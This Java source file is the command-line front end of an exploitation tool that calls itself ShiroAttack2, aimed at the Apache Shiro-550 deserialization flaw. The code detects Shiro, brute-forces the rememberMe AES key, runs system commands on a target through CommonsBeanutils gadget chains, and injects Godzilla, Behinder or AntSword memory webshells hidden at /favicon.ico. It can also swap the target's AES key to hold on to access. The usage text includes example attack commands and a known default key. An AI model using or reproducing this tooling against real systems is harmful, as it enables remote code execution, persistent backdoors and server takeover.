package com.summersec.attack.CLI;

import com.summersec.attack.core.AttackService;
import com.summersec.attack.integration.generator.model.EchoGenerateResult;
import com.summersec.attack.UI.MainController;
import com.summersec.attack.deser.plugins.servlet.MemBytes;
import com.summersec.attack.entity.ControllersFactory;
import com.summersec.attack.utils.CliOutputSink;
import com.summersec.attack.utils.OutputSink;
import java.util.*;

public class MainCLI {
    private static boolean jfxReady;

    public static void main(String[] args) {
        // Suppress MLog (mchange) java.util.logging output
        java.util.logging.Logger.getLogger("com.mchange").setLevel(java.util.logging.Level.OFF);
        if (args.length == 0 || args[0].equals("help") || args[0].equals("-h") || args[0].equals("--help")) {
            printUsage();
            return;
        }

        String cmd = args[0];
        if (cmd.equals("gui")) {
            com.summersec.attack.UI.Main.main(new String[0]);
            return;
        }

        CliArgs cli = new CliArgs(args);
        boolean jsonMode = cli.hasFlag("--json");

        try {
            switch (cmd) {
                case "detect": handleDetect(cli, jsonMode); break;
                case "memshell": handleMemshell(cli, jsonMode); break;
                case "changekey": handleChangeKey(cli, jsonMode); break;
                case "crack":  handleCrack(cli, jsonMode);  break;
                case "exec":   handleExec(cli, jsonMode);   break;
                default:
                    System.err.println("Unknown command: " + cmd);
                    printUsage();
                    System.exit(1);
            }
        } catch (Exception e) {
            if (jsonMode) {
                System.out.println("{\"status\":\"error\",\"msg\":\"" + escapeJson(e.getMessage()) + "\"}");
            } else {
                System.err.println("Error: " + e.getMessage());
                e.printStackTrace();
            }
            System.exit(1);
        }
        System.exit(0);
    }

    private static AttackService initAttackService(CliArgs cli, boolean jsonMode) {
        initJavaFX();

        OutputSink sink = new CliOutputSink(jsonMode);

        // Build a headless MainController with ConsoleTextArea-backed fields
        MainController mc = new MainController();
        mc.logTextArea = new ConsoleTextArea(sink);
        mc.InjOutputArea = new ConsoleTextArea(sink);
        // TextField/ComboBox are no-ops in CLI mode but prevent NPE
        mc.shiroKey = new javafx.scene.control.TextField();
        mc.gadgetOpt = new javafx.scene.control.ComboBox<>();
        mc.echoOpt = new javafx.scene.control.ComboBox<>();
        ControllersFactory.controllers.put(MainController.class.getSimpleName(), mc);

        String method = "GET";
        String url = cli.opt("-u", "");
        String keyword = cli.opt("-k", "rememberMe");
        String timeout = cli.opt("--timeout", "5");
        Map<String, String> headers = null;
        String postData = "";

        // AES mode
        if (cli.hasFlag("--gcm")) {
            AttackService.aesGcmCipherType = 1;
        } else if (cli.hasFlag("--cbc")) {
            AttackService.aesGcmCipherType = 0;
        }

        // proxy
        String proxyStr = cli.opt("--proxy");
        if (proxyStr != null && !proxyStr.isEmpty()) {
            MainController.currentProxy.put("proxy", buildProxy(proxyStr));
        }

        return new AttackService(method, url, keyword, timeout, headers, postData);
    }

    private static void initJavaFX() {
        if (jfxReady) return;
        try {
            new javafx.embed.swing.JFXPanel();
            jfxReady = true;
        } catch (Exception e) {
            // Try alternative initialization
            try {
                com.sun.javafx.application.PlatformImpl.startup(() -> {});
                jfxReady = true;
            } catch (Exception ex) {
                throw new RuntimeException("Cannot initialize JavaFX toolkit", ex);
            }
        }
    }

    private static java.net.Proxy buildProxy(String proxyStr) {
        String host = proxyStr.replaceFirst("https?://", "").replaceAll(":\\d+.*$", "");
        int port = Integer.parseInt(proxyStr.replaceFirst(".*:(\\d+).*", "$1"));
        return new java.net.Proxy(java.net.Proxy.Type.HTTP, new java.net.InetSocketAddress(host, port));
    }

    // --- Command handlers ---

    private static void handleDetect(CliArgs cli, boolean jsonMode) {
        AttackService as = initAttackService(cli, jsonMode);
        as.url = cli.require("-u");
        as.checkIsShiro();
    }

    private static void handleCrack(CliArgs cli, boolean jsonMode) {
        AttackService as = initAttackService(cli, jsonMode);
        as.url = cli.require("-u");

        boolean isShiro = as.checkIsShiro();
        if (!isShiro) {
            AttackService.realShiroKey = null;
            return;
        }

        String specificKey = cli.opt("-K");
        if (specificKey != null && !specificKey.isEmpty()) {
            as.simpleKeyCrack(specificKey);
        } else {
            as.keysCrack();
        }

        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
    }

    private static void handleExec(CliArgs cli, boolean jsonMode) {
        AttackService as = initAttackService(cli, jsonMode);
        String url = cli.require("-u");
        String key = cli.require("-K");
        String command = cli.require("-c");
        as.url = url;
        AttackService.realShiroKey = key;

        boolean jegMode = cli.hasFlag("--jeg");
        String gadget = cli.opt("-g");
        String echo = cli.opt("-e");
        if (echo == null || echo.isEmpty()) echo = "AllEcho";
        String serverType = cli.opt("--server");

        if (jegMode) {
            String[] servers = serverType != null && !serverType.isEmpty()
                    ? new String[]{serverType}
                    : new String[]{"SERVER_TOMCAT", "SERVER_SPRING_MVC", "SERVER_RESIN", "SERVER_WEBLOGIC", "SERVER_JETTY", "SERVER_WEBSPHERE", "SERVER_UNDERTOW", "SERVER_GLASSFISH"};
            String host = extractHost(as.url);
            String probeCmd = "echo \"Host: " + host + "\"";
            EchoGenerateResult jegResult = null;
            for (String srv : servers) {
                jegResult = as.generateEchoWithThirdParty(
                        "jEG", srv, "MODEL_CMD", "FORMAT_BASE64",
                        gadget, echo, key, probeCmd, "");
                if (jegResult.isSuccess() && jegResult.getPayload() != null) {
                    String cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
                    if (cookieLine != null) {
                        String probeResult = as.sendRememberMeCookieExploitWithCmd(cookieLine, probeCmd, true, null);
                        if (AttackService.responseIndicatesGadgetHit(probeResult)) {
                            // 命中，用实际命令执行
                            jegResult = as.generateEchoWithThirdParty(
                                    "jEG", srv, "MODEL_CMD", "FORMAT_BASE64",
                                    gadget, echo, key, command, "");
                            if (jegResult.isSuccess() && jegResult.getPayload() != null) {
                                cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
                                if (cookieLine != null) {
                                    AttackService.attackRememberMe = cookieLine;
                                    String result = as.sendRememberMeCookieExploitWithCmd(cookieLine, command, true, null);
                                    if (result != null) {
                                        System.out.println(result);
                                    }
                                    return;
                                }
                            }
                        }
                    }
                }
            }
            System.out.println("jEG 所有服务端类型均未命中");
            return;
        }

        if (gadget != null && !gadget.isEmpty()) {
            boolean hit = as.gadgetCrack(gadget, echo, key);
            if (!hit) {
                return;
            }
        } else {
            boolean hit = autoCrackGadget(as, key);
            if (!hit) {
                return;
            }
        }

        // Re-run to set attackRememberMe
        as.gadgetCrack(AttackService.gadget, echo, key);

        String result = as.execCmdTask(command);
        if (result != null) {
            System.out.println(result);
        }
    }

        private static void handleMemshell(CliArgs cli, boolean jsonMode) {
        AttackService as = initAttackService(cli, jsonMode);
        String url = cli.require("-u");
        String key = cli.require("-K");
        String type = cli.require("-t");
        as.url = url;
        AttackService.realShiroKey = key;

        if (cli.hasFlag("--dynamic-memshell")) {
            MemBytes.setDynamicMode(true);
        }

        String pass = cli.opt("--pass", "passwd");
        String path = cli.opt("--path", "/favicon.ico");

        boolean hit = autoCrackGadget(as, key);
        if (!hit) {
            return;
        }

        as.gadgetCrack(AttackService.gadget, "InjectMemTool", key);
        as.injectMem(type, pass, path);
    }

    private static void handleChangeKey(CliArgs cli, boolean jsonMode) {
        AttackService as = initAttackService(cli, jsonMode);
        String url = cli.require("-u");
        String key = cli.require("-K");
        String newKey = cli.require("--newkey");
        as.url = url;
        AttackService.realShiroKey = key;

        if (cli.hasFlag("--dynamic-memshell")) {
            MemBytes.setDynamicMode(true);
        }

        String variant = cli.opt("--variant", "filterConfigs -> shiroFilterFactoryBean");

        boolean hit = autoCrackGadget(as, key);
        if (!hit) {
            return;
        }

        as.gadgetCrack(AttackService.gadget, "InjectMemTool", key);
        as.injectMem(variant, newKey, "/");
    }

    private static boolean autoCrackGadget(AttackService as, String key) {
        // 优先无 commons-collections 依赖的变体 (String/AttrCompare/ObjectToStringComparator)
        // 这些使用自定义 Comparator，不需目标 classpath 上有 commons-collections
        String[] gadgets = {
            "CommonsBeanutilsString_183", "CommonsBeanutilsString",
            "CommonsBeanutilsAttrCompare_183", "CommonsBeanutilsAttrCompare",
            "CommonsBeanutilsObjectToStringComparator_183", "CommonsBeanutilsObjectToStringComparator",
            // 以下依赖 commons-collections (ComparableComparator)，仅在目标有此依赖时命中
            "CommonsBeanutils1_183", "CommonsBeanutils1",
            "CommonsBeanutilsPropertySource_183", "CommonsBeanutilsPropertySource",
        };
        String[] echoes = {"AllEcho", "TomcatEcho", "SpringEcho"};

        for (String g : gadgets) {
            for (String e : echoes) {
                if (as.gadgetCrack(g, e, key)) {
                    return true;
                }
            }
        }
        return false;
    }

    // --- Helpers ---

    private static String extractHost(String url) {
        try {
            java.net.URL u = new java.net.URL(url);
            return u.getPort() > 0 && u.getPort() != u.getDefaultPort()
                    ? u.getHost() + ":" + u.getPort() : u.getHost();
        } catch (Exception e) {
            return "127.0.0.1";
        }
    }

    private static String escapeJson(String s) {
        if (s == null) return "null";
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
    }

        private static void printUsage() {
        System.out.println("ShiroAttack2 CLI - Shiro-550 exploitation");
        System.out.println();
        System.out.println("Usage: java -jar shiro_attack-<ver>.jar <command> [options]");
        System.out.println();
        System.out.println("Commands:");
        System.out.println("  detect     Probe for Shiro framework");
        System.out.println("  crack      Brute-force or verify Shiro key");
        System.out.println("  exec       Execute system command via gadget chain");
        System.out.println("  memshell   Inject memory shell (Godzilla, Behinder, AntSword, etc.)");
        System.out.println("  changekey  Replace target Shiro AES key");
        System.out.println("  gui        Launch GUI mode");
        System.out.println();
        System.out.println("Common options:");
        System.out.println("  -u <url>            Target URL");
        System.out.println("  -k <keyword>        rememberMe cookie name (default: rememberMe)");
        System.out.println("  -K <key>            Shiro AES key (base64)");
        System.out.println("  -c <command>        System command (exec)");
        System.out.println("  -g <gadget>         Gadget chain (auto-detect if omitted)");
        System.out.println("  -e <echo>           Echo type: AllEcho|TomcatEcho|SpringEcho");
        System.out.println("  -t <type>           Memshell type: 哥斯拉[Filter], 冰蝎[Servlet], ...");
        System.out.println("  --pass <p>          Memshell password (default: passwd)");
        System.out.println("  --path <p>          Memshell URL path (default: /favicon.ico)");
        System.out.println("  --dynamic-memshell  Use Javassist runtime compile (instead of hardcoded Base64)");
        System.out.println("  --newkey <nk>       New Shiro AES key for changekey");
        System.out.println("  --variant <v>       Key change injection variant");
        System.out.println("  --jeg               Use jEG (third-party echo generator, requires --gcm)");
        System.out.println("  --cbc               AES-CBC mode (Shiro <= 1.2.4)");
        System.out.println("  --gcm               AES-GCM mode (Shiro >= 1.2.5)");
        System.out.println("  --proxy <url>       HTTP proxy (http://host:port)");
        System.out.println("  --timeout <sec>     Timeout in seconds (default: 5)");
        System.out.println("  --json              Output in JSON format");
        System.out.println();
        System.out.println("Examples:");
        System.out.println("  java -jar xxx.jar detect    -u http://target:8080");
        System.out.println("  java -jar xxx.jar crack     -u http://target:8080 --cbc");
        System.out.println("  java -jar xxx.jar crack     -u http://target:8080 -K kPH+bIxk5D2deZiIxcaaaA==");
        System.out.println("  java -jar xxx.jar exec      -u http://target:8080 -K <key> -c id --cbc");
        System.out.println("  java -jar xxx.jar exec      -u http://target:8080 -K <key> -c whoami -g CommonsBeanutils1_183");
        System.out.println("  java -jar xxx.jar exec      -u http://target:8080 -K <key> -c id --jeg --gcm");
        System.out.println("  java -jar xxx.jar memshell  -u http://target:8080 -K <key> -t 哥斯拉[Filter]");
        System.out.println("  java -jar xxx.jar changekey -u http://target:8080 -K <oldkey> --newkey <newkey>");
    }

    private static class CliArgs {
        private final Map<String, String> map = new LinkedHashMap<>();
        private final Set<String> flags = new HashSet<>();

        CliArgs(String[] args) {
            for (int i = 1; i < args.length; i++) {
                String a = args[i];
                if (a.startsWith("--")) {
                    if (i + 1 < args.length && !args[i + 1].startsWith("-")) {
                        map.put(a, args[++i]);
                    } else {
                        flags.add(a);
                    }
                } else if (a.startsWith("-")) {
                    if (a.length() == 2 && i + 1 < args.length && !args[i + 1].startsWith("-")) {
                        map.put(a, args[++i]);
                    } else {
                        flags.add(a);
                    }
                }
            }
        }

        String require(String key) {
            String v = map.get(key);
            if (v == null || v.isEmpty()) throw new RuntimeException("Missing required arg: " + key);
            return v;
        }

        String opt(String key) { return map.get(key); }
        String opt(String key, String def) { return map.getOrDefault(key, def); }
        boolean hasFlag(String f) { return flags.contains(f); }
    }
}
